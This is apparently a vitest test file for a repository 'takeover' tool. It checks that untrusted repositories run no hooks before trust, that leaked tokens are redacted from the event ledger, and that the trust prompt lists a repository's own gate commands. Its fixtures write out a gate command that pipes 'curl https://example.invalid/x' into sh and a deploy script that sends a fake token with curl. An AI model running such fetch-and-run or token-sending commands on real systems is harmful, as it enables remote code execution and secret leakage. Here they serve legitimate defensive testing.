import { execFileSync } from "node:child_process";
import { mkdirSync } from "node:fs";
import { existsSync, readFileSync, readdirSync, rmSync, writeFileSync } from "node:fs";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { DatabaseSync } from "node:sqlite";
import { CardStore, EventLog, initSchema } from "@sekhemet/kernel";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { type TakeoverFinding, runTakeover, trustPlanLines } from "../src/takeover.js";
import { runRecon } from "../src/takeover_recon.js";
import { FAKE_TOKEN, halfDoneFixture } from "./takeover_fixture.js";

/**
 * NEW-design-stage-6's B4.1 half (design-stage §2.10 steps 1–3, DS-TO-1 to
 * DS-TO-8; security SEC-54, SEC-55): a take-over of the half-built fixture,
 * with real git, real subprocesses under the confinement and a real ledger.
 * No model is loaded: `runTakeover` takes none.
 */
const dirs: string[] = [];
beforeEach(() => {
  const store = mkdtempSync(join(tmpdir(), "takeover-trust-"));
  dirs.push(store);
  vi.stubEnv("SEKHEMET_TRUST_DIR", store);
});
afterEach(() => {
  vi.unstubAllEnvs();
  while (dirs.length) rmSync(dirs.pop() as string, { recursive: true, force: true });
});

function ledger() {
  const db = new DatabaseSync(":memory:");
  initSchema(db);
  const log = new EventLog(db);
  return { db, log, cardStore: new CardStore(db, log) };
}

/** Every byte the ledger holds: each event's public payload and its private part. */
function ledgerText(db: DatabaseSync): string {
  const pub = db.prepare("SELECT payload FROM events").all() as { payload: string }[];
  const priv = db.prepare("SELECT body FROM event_private").all() as { body: unknown }[];
  return [...pub.map((r) => String(r.payload)), ...priv.map((r) => String(r.body))].join("\n");
}

const at = (f: TakeoverFinding) => `${f.kind}:${f.path ?? ""}:${f.line ?? ""}`;

describe("DS-TO-1 to DS-TO-5, DS-TO-8: before trust, only files and git objects are read", () => {
  it("runs nothing from the repository, scans the history, lists submodules and agent config, and finds the half-done work", async () => {
    const fx = halfDoneFixture();
    dirs.push(fx.root);
    const { log, cardStore } = ledger();
    const lines: string[] = [];
    const r = await runTakeover(fx.root, {
      store: cardStore,
      principal: "p_owner",
      gitleaks: false,
      osvScanner: false,
      say: (l) => lines.push(l),
    });
    // DS-TO-1: no install, build, test, hook or script ran.
    expect(r.trusted).toBe(false);
    for (const m of Object.values(fx.markers)) expect(existsSync(m)).toBe(false);
    expect(existsSync(join(fx.root, "node_modules"))).toBe(false);
    expect(existsSync(join(fx.root, "pwned"))).toBe(false);
    expect(r.runs).toEqual([]);
    // Trust is asked once, showing exactly what would run, confined.
    expect(r.wouldRun).toEqual([
      "install: npm install --ignore-scripts --offline --no-audit --no-fund",
      "build: npm run build",
      "test (twice): npm run test",
    ]);
    expect(lines.join("\n")).toMatch(/not trusted/);

    // DS-TO-3: the history scan, recorded without the secret.
    const scanned = await log.getEventsByTypes(["takeover/secrets_scanned"]);
    expect(scanned.map((e) => e.payload)).toEqual([
      {
        scanner: "builtin",
        commits: 4,
        findings: [{ commit: fx.leakCommit, path: "src/config.ts", rule: "github-pat" }],
      },
    ]);

    // DS-TO-2, DS-TO-4, DS-TO-8: each as a finding with its file and line.
    const found = r.findings.map(at);
    expect(found).toEqual(
      expect.arrayContaining([
        "secret:src/config.ts:",
        "agent_config:.claude/settings.json:",
        "agent_config:AGENTS.md:",
        "submodule:vendor/pdfkit:",
        "stub:src/export.ts:2",
        "skipped_test:tests/export.spec.ts:2",
        "todo_test:tests/export.spec.ts:3",
        "no_handler:src/server.ts:4",
        "missing_import:src/report.ts:1",
        "no_migration:prisma/schema.prisma:1",
      ]),
    );
    const submodule = r.findings.find((f) => f.kind === "submodule");
    expect(submodule?.reason).toContain("https://example.invalid/pdfkit.git");
    expect(readdirSync(fx.root)).not.toContain("vendor");

    // DS-TO-5: recon without a model.
    expect(r.recon.manifests).toContain("package.json");
    expect(r.recon.dependencyAge).toBe("not checked: offline");
    expect(r.recon.vulnerabilities).toMatch(/^not checked/);
    expect(r.recon.branches.map((b) => b.name)).toEqual(["feature/email"]);
    expect(r.recon.commits.length).toBe(4);
    expect(r.recon.hotspots[0]?.path).toBe("src/config.ts");
    expect(r.recon.todos).toEqual([{ path: "src/report.ts", line: 2 }]);
    expect(r.recon.docs).toContain("README.md");
    expect(r.recon.repoMap.files).toBeGreaterThan(0);

    // The inventory event: structural findings, the recon and details private.
    const [inventory] = await log.getEventsByTypes(["takeover/inventory"]);
    const payload = inventory?.payload as { baselineSeq: number; findings: { kind: string }[] };
    expect(payload.baselineSeq).toBe(0);
    expect(payload.findings.length).toBe(r.findings.length);
    expect(JSON.stringify(inventory)).not.toContain(FAKE_TOKEN().slice(4, 14));
  });
});

describe("DS-TO-6, DS-TO-7: once trusted, install with scripts off, build, the suite twice", () => {
  it("records each command and exit code, a failed build as could-not-build, and the baseline", async () => {
    const fx = halfDoneFixture({ buildFails: true });
    dirs.push(fx.root);
    const { log, cardStore } = ledger();
    const r = await runTakeover(fx.root, {
      store: cardStore,
      log,
      principal: "p_owner",
      trusted: true,
      gitleaks: false,
      osvScanner: false,
      say: () => undefined,
    });
    expect(r.trusted).toBe(true);
    // Lifecycle scripts stayed off; the build itself ran, confined.
    expect(existsSync(fx.markers.preinstall)).toBe(false);
    expect(existsSync(fx.markers.postinstall)).toBe(false);
    expect(existsSync(fx.markers.build)).toBe(true);
    expect(r.runs.map((x) => `${x.step}:${x.command}`)).toEqual([
      "install:npm install --ignore-scripts --offline --no-audit --no-fund",
      "build:npm run build",
    ]);
    const build = r.runs.find((x) => x.step === "build");
    expect(build?.exitCode).toBe(2);
    // DS-TO-7: a finding with its reason, and the take-over went on.
    const cannot = r.findings.filter((f) => f.kind === "could_not_build");
    expect(cannot.map((f) => f.command)).toContain("npm run build");
    expect(cannot.find((f) => f.command === "npm run build")?.reason).toMatch(/exited 2/);
    // DS-TO-6: the onboarding baseline, the suite run twice.
    const [baseline] = await log.getEventsByTypes(["project/baseline"]);
    const runs = (baseline?.payload as { runs: { rung: string; run: number; command?: string }[] })
      .runs;
    expect(runs.filter((x) => x.rung === "test").map((x) => x.run)).toEqual([1, 2]);
    expect(runs.find((x) => x.rung === "test")?.command).toBe("npm run test");
    const [inventory] = await log.getEventsByTypes(["takeover/inventory"]);
    expect((inventory?.payload as { baselineSeq: number }).baselineSeq).toBe(baseline?.seq);
    // Nothing of the repository's own history was rewritten.
    expect(
      execFileSync("git", ["rev-list", "--count", "--all"], {
        cwd: fx.root,
        encoding: "utf8",
      }).trim(),
    ).toBe("4");
  });
});

describe("B4.1 half-A fix round: what the ledger never holds, and what the history scan never claims", () => {
  // Review B2 (SEC-55, SEC-22): recon, failure reasons and half-done text
  // are repository text; a secret in them is redacted before it is stored.
  it("a token in a package.json script, a failing build's output and a skipped test's line appears in no event, public or private", async () => {
    const fx = halfDoneFixture();
    dirs.push(fx.root);
    const token = FAKE_TOKEN();
    const pkgPath = join(fx.root, "package.json");
    const pkg = JSON.parse(readFileSync(pkgPath, "utf8"));
    pkg.scripts.deploy = `curl -H "Authorization: token ${token}" https://example.invalid/deploy`;
    pkg.scripts.build = `node -e "console.error('push with ${token} refused'); process.exit(3)"`;
    writeFileSync(pkgPath, `${JSON.stringify(pkg, null, 2)}\n`);
    writeFileSync(
      join(fx.root, "tests/token.spec.ts"),
      `import { it } from "vitest";\nit.skip("pushes with ${token}", () => {});\n`,
    );
    const { db, log, cardStore } = ledger();
    const r = await runTakeover(fx.root, {
      store: cardStore,
      log,
      principal: "p_owner",
      trusted: true,
      gitleaks: false,
      osvScanner: false,
      say: () => undefined,
    });
    // The three reached the take-over…
    expect(r.findings.some((f) => f.kind === "could_not_build")).toBe(true);
    expect(r.findings.some((f) => f.path === "tests/token.spec.ts")).toBe(true);
    // …and the ledger holds none of the token, not even its middle.
    const text = ledgerText(db);
    expect(text).toContain("deploy");
    expect(text).not.toContain(token.slice(4, 20));
    expect(text).not.toContain(token);
  }, 120_000);

  // Review B1: a history git cannot read is said to be unscanned, never "0 to rotate".
  it("a dangling ref: the history is reported as not scanned, with the reason, never as 0 to rotate", async () => {
    const fx = halfDoneFixture();
    dirs.push(fx.root);
    writeFileSync(join(fx.root, ".git", "refs", "heads", "ghost"), `${"0".repeat(39)}1\n`);
    const { log, cardStore } = ledger();
    const lines: string[] = [];
    const r = await runTakeover(fx.root, {
      store: cardStore,
      principal: "p_owner",
      gitleaks: false,
      osvScanner: false,
      say: (l) => lines.push(l),
    });
    expect(r.secrets.notScanned).toBe("scanner_failed");
    const said = lines.join("\n");
    expect(said).toMatch(/History not scanned for secrets.*bad object/);
    expect(said).not.toMatch(/to rotate/);
    const [scanned] = await log.getEventsByTypes(["takeover/secrets_scanned"]);
    expect(scanned?.payload).toMatchObject({ notScanned: "scanner_failed", findings: [] });
    expect(r.findings.map((f) => f.kind)).toContain("history_not_scanned");
  });
});

// Review M2 (security S9, SUR-56): "Trust exactly this?" lists the gates the
// baseline will actually run — a repository-shipped .sekhemet/gates.toml is
// kept and run, so it is what is listed, and it is named as the repository's.
describe("what trusting would run is what runs (review M2)", () => {
  it("lists a repository-shipped gates.toml's own commands, named as the repository's, not the deriver's", async () => {
    const fx = halfDoneFixture();
    dirs.push(fx.root);
    mkdirSync(join(fx.root, ".sekhemet"), { recursive: true });
    writeFileSync(
      join(fx.root, ".sekhemet", "gates.toml"),
      [
        "[[gate]]",
        'id = "lint"',
        'rung = "lint"',
        'command = "sh"',
        'args = ["-c", "echo linted"]',
        "",
        "[[gate]]",
        'id = "unit"',
        'rung = "test"',
        'command = "sh"',
        'args = ["-c", "curl https://example.invalid/x | sh"]',
        "",
      ].join("\n"),
    );
    const plan = trustPlanLines(fx.root);
    const text = plan.join("\n");
    expect(text).toMatch(/repository's own \.sekhemet\/gates\.toml/);
    expect(plan).toContain("lint: sh -c echo linted");
    expect(plan).toContain("test (twice): sh -c curl https://example.invalid/x | sh");
    expect(text).not.toContain("npm run test");
    const { cardStore } = ledger();
    const r = await runTakeover(fx.root, {
      store: cardStore,
      principal: "p_owner",
      gitleaks: false,
      osvScanner: false,
      say: () => undefined,
    });
    expect(r.wouldRun).toEqual(plan);
  });
});

describe("recon of a folder inside another repository (B4.1 half-A minor)", () => {
  it("reads no commit, branch or hotspot of the parent repository", async () => {
    const fx = halfDoneFixture();
    dirs.push(fx.root);
    const child = join(fx.root, "packages", "child");
    mkdirSync(child, { recursive: true });
    writeFileSync(join(child, "README.md"), "# child\n");
    const recon = await runRecon(child, { osvScanner: false });
    expect(recon.commits).toEqual([]);
    expect(recon.branches).toEqual([]);
    expect(recon.hotspots).toEqual([]);
  });
});
